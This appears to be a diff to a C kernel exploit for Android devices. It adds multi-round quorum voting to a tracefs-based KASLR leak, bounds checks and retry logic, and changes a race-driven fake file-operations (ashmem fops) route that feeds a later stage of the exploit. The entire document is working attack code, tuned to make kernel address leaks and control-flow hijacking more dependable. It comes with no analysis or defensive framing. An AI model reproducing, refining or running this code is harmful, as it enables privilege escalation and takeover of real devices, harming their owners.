@@ -25,7 +25,8 @@
 #define SLIDE_REQUEUE_MAX_POLLS 1000
 #define SLIDE_REQUEUE_POLL_USEC 1000
 
-#if defined(APP_S928_STABLE_RACE) && APP_S928_STABLE_RACE
+#if defined(APP_S928_STABLE_RACE) && APP_S928_STABLE_RACE && \
+    !(defined(APP_TRACEFS_SLIDE) && APP_TRACEFS_SLIDE)
 #define SLIDE_TRACEFS_ROOT "/sys/kernel/tracing"
 
 static int slide_tracefs_write(const char *path, const char *value) {
@@ -150,6 +151,12 @@ static const uintptr_t slide_p0_offsets[] = {
 static uint32_t slide_f_wait;
 static uint32_t slide_f_pi_target;
 static uint32_t slide_f_pi_chain;
+/* Last-fired fops route configuration (parent address space). Trusted by
+ * the production-touch probe only when fired_route_slot == 0. */
+size_t fired_route_slot = (size_t)-1;
+uintptr_t fired_route_parent = 0;
+uintptr_t fired_route_target = 0;
+uintptr_t fired_route_lock = 0;
 static atomic_int slide_waiter_ready;
 static atomic_int slide_waiter_waiting;
 static atomic_int slide_owner_started;
@@ -201,6 +208,12 @@ static const uint64_t slide_max_offset = 0x3f8000ULL;
 #if defined(APP_TRACEFS_SLIDE) && APP_TRACEFS_SLIDE
 #define SLIDE_TRACEFS_ROOT "/sys/kernel/tracing"
 #define SLIDE_TRACEFS_CANDIDATES 128
+/* Quorum threshold for the APP voter. Targets that care define
+ * SLIDE_TRACEFS_MIN_VOTES in their target.h (FZG1: 2); the root-umh
+ * voter in slide.c independently defaults to 3. */
+#ifndef SLIDE_TRACEFS_MIN_VOTES
+#define SLIDE_TRACEFS_MIN_VOTES 2
+#endif
 static unsigned int slide_tracefs_raw_pages;
 static unsigned int slide_tracefs_raw_bytes;
 static unsigned int slide_tracefs_raw_events;
@@ -378,11 +391,15 @@ static int slide_tracefs_parse_page(const unsigned char *page,
       }
       uint64_t caller = 0;
       memcpy(&caller, page + record + 16, sizeof(caller));
-      if (slide_tracefs_raw_callers < 8) {
+      if (slide_tracefs_raw_callers < 64) {
         pr_info("slide tracefs raw caller=%016llx event=%u len=%zu\n",
                 (unsigned long long)caller, event_id, record_len);
       }
       slide_tracefs_raw_callers++;
+      /* Dual-anchor voting: worker_thread and vfork anchors.
+       * The delta between WORKER_CALLER_OFF and VFORK_CALLER_OFF (0x44b60)
+       * is not a multiple of 0x8000, preventing ghost collisions on the
+       * 32 KB candidate grid. */
       static const uint64_t link_callers[] = {
         KIMAGE_TEXT_BASE + SLIDE_TRACEFS_WORKER_CALLER_OFF,
 #ifdef SLIDE_TRACEFS_VFORK_CALLER_OFF
@@ -396,7 +413,9 @@ static int slide_tracefs_parse_page(const unsigned char *page,
           if (candidate <= slide_max_offset &&
               (candidate & 0x7fffULL) == 0) {
             size_t slot = (size_t)(candidate >> 15);
-            slide_tracefs_candidate_hits[slot]++;
+            if (slot < SLIDE_TRACEFS_CANDIDATES) {
+              slide_tracefs_candidate_hits[slot]++;
+            }
           }
         }
       }
@@ -420,7 +439,11 @@ static int slide_tracefs_trigger_vfork(void) {
       syscall(SYS_nanosleep, &hold, NULL);
       _exit(0);
     }
-    if (waitpid(child, &status, 0) != child) {
+    pid_t waited;
+    do {
+      waited = waitpid(child, &status, 0);
+    } while (waited < 0 && errno == EINTR);
+    if (waited != child) {
       pr_warning("slide tracefs waitpid failed errno=%d\n", errno);
       return 0;
     }
@@ -519,6 +542,8 @@ static int slide_tracefs_leak_kernel_base(void) {
   int cpu_files = 0;
   int candidate_count = 0;
   uintptr_t candidate = 0;
+  unsigned best_hits = 0;
+  unsigned second_hits = 0;
 
   if (!slide_tracefs_read_u32(tracing_on, &old_tracing) ||
       !slide_tracefs_read_u32(event_enable, &old_event) ||
@@ -534,6 +559,24 @@ static int slide_tracefs_leak_kernel_base(void) {
   restore_needed = 1;
   pr_info("slide tracefs state tracing=%u event=%u id=%u\n",
           old_tracing, old_event, event_id);
+  /* In-process retry: sampling costs nothing (no one-shot consumed) and
+   * the blocked-task mix varies per round (single-callsite rounds carry
+   * no quorum information). */
+  for (int trace_round = 1; trace_round <= 3; trace_round++) {
+    pr_info("slide tracefs round=%d/3\n", trace_round);
+    scan_ok = 1;
+    slide_tracefs_raw_pages = 0;
+    slide_tracefs_raw_bytes = 0;
+    slide_tracefs_raw_events = 0;
+    slide_tracefs_raw_callers = 0;
+    slide_tracefs_parse_failures = 0;
+    cpu_files = 0;
+    candidate_count = 0;
+    candidate = 0;
+    best_hits = 0;
+    second_hits = 0;
+    memset(slide_tracefs_candidate_hits, 0,
+           sizeof(slide_tracefs_candidate_hits));
   if (!slide_tracefs_write(tracing_on, "0") ||
       !slide_tracefs_write(event_enable, "0") ||
       !slide_tracefs_clear(trace) ||
@@ -543,7 +586,10 @@ static int slide_tracefs_leak_kernel_base(void) {
     goto out;
   }
   if (!slide_tracefs_trigger()) {
-    goto out;
+    slide_tracefs_write(tracing_on, "0");
+    slide_tracefs_write(event_enable, "0");
+    sleep(1);
+    continue;
   }
   if (!slide_tracefs_write(tracing_on, "0") ||
       !slide_tracefs_write(event_enable, "0")) {
@@ -557,13 +603,7 @@ static int slide_tracefs_leak_kernel_base(void) {
              errno);
     goto out;
   }
-  slide_tracefs_raw_pages = 0;
-  slide_tracefs_raw_bytes = 0;
-  slide_tracefs_raw_events = 0;
-  slide_tracefs_raw_callers = 0;
-  slide_tracefs_parse_failures = 0;
-  memset(slide_tracefs_candidate_hits, 0,
-         sizeof(slide_tracefs_candidate_hits));
+  /* Per-round counters were reset at the loop top; parse accumulates. */
   for (int cpu = 0; cpu < cpu_count; cpu++) {
     char path[128];
     snprintf(path, sizeof(path),
@@ -608,6 +648,7 @@ static int slide_tracefs_leak_kernel_base(void) {
       scan_ok = 0;
     }
   }
+  /* best/second reset at the loop top; evaluate accumulated hits. */
   for (size_t slot = 0; slot < SLIDE_TRACEFS_CANDIDATES; slot++) {
     if (!slide_tracefs_candidate_hits[slot]) {
       continue;
@@ -615,19 +656,37 @@ static int slide_tracefs_leak_kernel_base(void) {
     uintptr_t slot_candidate = slot << 15;
     pr_info("slide tracefs candidate=%08zx hits=%u\n",
             slot_candidate, slide_tracefs_candidate_hits[slot]);
-    candidate = slot_candidate;
+    if (slide_tracefs_candidate_hits[slot] > best_hits) {
+      second_hits = best_hits;
+      best_hits = slide_tracefs_candidate_hits[slot];
+      candidate = slot_candidate;
+    } else if (slide_tracefs_candidate_hits[slot] > second_hits) {
+      second_hits = slide_tracefs_candidate_hits[slot];
+    }
     candidate_count++;
   }
   pr_info("slide tracefs raw summary pages=%u bytes=%u events=%u callers=%u parse_fail=%u candidates=%d cpu_files=%d\n",
           slide_tracefs_raw_pages, slide_tracefs_raw_bytes,
           slide_tracefs_raw_events, slide_tracefs_raw_callers,
           slide_tracefs_parse_failures, candidate_count, cpu_files);
+  /* Quorum (reference semantics from slide.c): the best slot must clear
+   * MIN_VOTES and STRICTLY exceed the runner-up. Ghost slots sit exactly
+   * one anchor-delta away (A1-A2 = 0xA8000) and tie a symmetric split, so
+   * ties fail closed (reboot + resample) instead of coin-flipping KASLR. */
   if (!scan_ok || slide_tracefs_parse_failures || !cpu_files ||
-      candidate_count != 1) {
-    pr_warning("slide tracefs candidate gate failed\n");
-    goto out;
+      !candidate_count || best_hits < (unsigned)SLIDE_TRACEFS_MIN_VOTES ||
+      best_hits == second_hits) {
+    pr_info("slide tracefs round=%d no quorum best=%u second=%u "
+            "slots=%d; retrying\n",
+            trace_round, best_hits, second_hits, candidate_count);
+    sleep(1);
+    continue;
   }
+  pr_info("slide tracefs quorum best=%08zx hits=%u second=%u slots=%d\n",
+          candidate, best_hits, second_hits, candidate_count);
   setup_ok = 1;
+  break;
+  }
 
 out:
   if (restore_needed) {
@@ -647,6 +706,15 @@ out:
     return 0;
   }
   pr_success("slide tracefs caller gate candidate=%08zx\n", candidate);
+#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
+  /* In-process quorum discovery satisfies the full-route freshness gate in
+   * run_exploit: the slide is from this boot and this process, and the
+   * alias verifier below prepares its own fresh P0 oracle pages per
+   * attempt. Without this, REQUIRE targets can never take the tracefs
+   * path (physical-scan fingerprint grid is 0x10000 while this KASLR is
+   * 0x8000-granular). */
+  slide_p0_session_fresh = 1;
+#endif
   return slide_commit_stext(KIMAGE_TEXT_BASE + candidate, "tracefs");
 }
 #endif
@@ -693,7 +761,7 @@ static useconds_t slide_enter_delay_usec(void) {
 #endif
 }
 
-static void slide_wait_before_consume(int sequence) {
+static void __attribute__((unused)) slide_wait_before_consume(int sequence) {
   if (sequence == 1) {
     useconds_t delay = slide_enter_delay_usec();
     if (delay) {
@@ -1025,6 +1093,9 @@ RMG_RACE_INLINE void prepare_slide_pselect_fdsets(
 RMG_RACE_INLINE void open_slide_selected_fds(
     fd_set *in, fd_set *out, fd_set *ex, int read_fd) {
   for (int fd = 0; fd < slide_route_nfds; fd++) {
+    if (fd <= STDERR_FILENO) {
+      continue;
+    }
     if (FD_ISSET(fd, in) || FD_ISSET(fd, out) || FD_ISSET(fd, ex)) {
       dup2(read_fd, fd);
     }
@@ -2255,9 +2326,22 @@ static int app_trigger_fops_slide_slot(size_t slot) {
     70000, 60000, 80000, 40000, 90000, 50000,
     30000, 20000, 75000, 65000, 85000, 55000,
   };
+#if defined(APP_CLOSED_FOPS_ROUTE) && APP_CLOSED_FOPS_ROUTE && \
+    !defined(APP_FOPS_REUSE_VERIFIED_PAGE)
+  /* CLOSED production keeps its proven direct geometry bit-for-bit
+   * (fake_* globals from the non-banked FOPS construction). Only the
+   * alias-verifier slots (probe active) go through the bank. */
+  if (slot == 0 && !fops_data_probe_active) {
+    slide_oracle_parent = fake_fops;
+    slide_oracle_target = data_addr(ASHMEM_MISC_FOPS);
+  } else if (!select_slide_payload_index(slot)) {
+    return 0;
+  }
+#else
   if (!select_slide_payload_index(slot)) {
     return 0;
   }
+#endif
   int delay = 0;
 #if defined(APP_S928_STABLE_RACE) && APP_S928_STABLE_RACE
   int forced_delay = slide_s928_fops_delay_override(&delay);
@@ -2303,6 +2387,13 @@ static int app_trigger_fops_slide_slot(size_t slot) {
           "lock=%016zx delay=%d fine_ticks=%llu\n",
           slot, slide_oracle_parent, slide_oracle_target, fake_lock, delay,
           (unsigned long long)slide_route_fine_delay_ticks);
+  /* Stash the firing configuration for the post-trigger production-touch
+   * probe (parent process address space; children get copies). The probe
+   * only trusts the stash when stash slot == production slot 0. */
+  fired_route_slot = slot;
+  fired_route_parent = slide_oracle_parent;
+  fired_route_target = slide_oracle_target;
+  fired_route_lock = fake_lock;
   app_publish_writer_started();
 #if defined(APP_S928_STABLE_RACE) && APP_S928_STABLE_RACE
   /* A successful child result advances directly to the CFI stage without
@@ -2398,7 +2489,8 @@ int app_trigger_fops_slide_route(void) {
 
 static int slide_leak_physical_base(void) {
   size_t started = gettime_ns();
-#if defined(APP_S928_STABLE_RACE) && APP_S928_STABLE_RACE
+#if defined(APP_S928_STABLE_RACE) && APP_S928_STABLE_RACE && \
+    !(defined(APP_TRACEFS_SLIDE) && APP_TRACEFS_SLIDE)
   uint64_t tracefs_base = 0;
   int tracefs_known = slide_tracefs_resolve_base(&tracefs_base);
   if (tracefs_known) {
@@ -2559,7 +2651,8 @@ static int slide_leak_physical_base(void) {
     slide_restore_physical_oracle();
     return 0;
   }
-#if defined(APP_S928_STABLE_RACE) && APP_S928_STABLE_RACE
+#if defined(APP_S928_STABLE_RACE) && APP_S928_STABLE_RACE && \
+    !(defined(APP_TRACEFS_SLIDE) && APP_TRACEFS_SLIDE)
   if (tracefs_known) {
     if (!slide_trigger_physical_slot(P0_ORACLE_GATE_RESTORE_SLOT)) {
       return 0;
